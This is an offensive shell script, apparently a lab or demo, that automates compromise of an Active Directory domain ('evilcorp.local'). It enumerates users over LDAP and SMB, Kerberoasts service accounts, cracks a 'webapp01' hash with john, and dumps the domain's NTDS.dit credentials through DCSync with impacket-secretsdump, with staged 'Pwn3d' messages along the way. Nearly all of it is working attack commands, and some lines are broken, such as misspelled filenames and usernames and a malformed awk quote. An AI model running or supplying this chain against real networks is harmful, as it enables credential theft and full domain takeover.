start=`date +%s`

nmap -p 389 -T4 -A -v -v -v -v -Pn --open --script ldap-rootdse,ldap-search 192.168.5.127

crackmapexec smb 192.168.5.127 -u " -p" --users > cmeusers.txt
cat cmeuser.txt | awk '{ FS = " " } ; { print $5 }' > cme_usernames.txt
cme_usernames.txt | awk '{ FS = "\" } ; { print $2 }'
cat cme_usernames.txt | awk '{ FS = "\\" } ; { print $2 }' > cme_targetusers.txt
awk '{ F= " " } ; { print $6 }' smb_valid_users.txt > smb_valid_usernames.txt
cat smb_valid_usernames.txt | grep + | awk '{ FS = " " } ; { print $6 }' | awk '{ FS = "\\" } ; { print $2 }'

impacket-GetUserSPNs -dc-ip 192.168.5.127 evilcorp.local/helpdesk:password
impacket-GetUserSPNs evilcorp.local/helpdesk:password -dc-ip 192.168.5.127 -outputfile domain_tgs_hashes.txt
sleep 3
echo "dumping domain admins...."
sleep 5
crackmapexec smb 192.168.5.127 -u helpesk -p password --groups "Domain Admins"
sleep 1
clear
echo "Exporting 'Domain Admin: webapp01 ' hash to file..."
sleep 3
cat domain_tgs_hashes.txt | grep -e webapp01 > webapp01.hash
clear
echo "Kerberoast in progress!"
echo "CRACKING HASHES.... PLEASE WAIT..."

john --wordlist=usernames.txt --rule=dive webapp01.hash

sleep 25
echo "...."
echo "Status: user "webapp01" Cracked!"
echo "##########Pwn3d##############"
echo "Dumping NTDS.dit via DCSYNC!"

impacket-secretsdump -dc-ip 192.168.5.127 -use-vss -target-ip 192.168.5.127 evilcorp.local/webapp01:'webapp0101!'@192.168.5.127

echo "Domain Dumped via VSS"
echo "...."
sleep 1
clear
end=`date +%s`
echo "Domain can be totally pwn3d in:" `expr $end - $start` seconds.
echo "Script Complete"
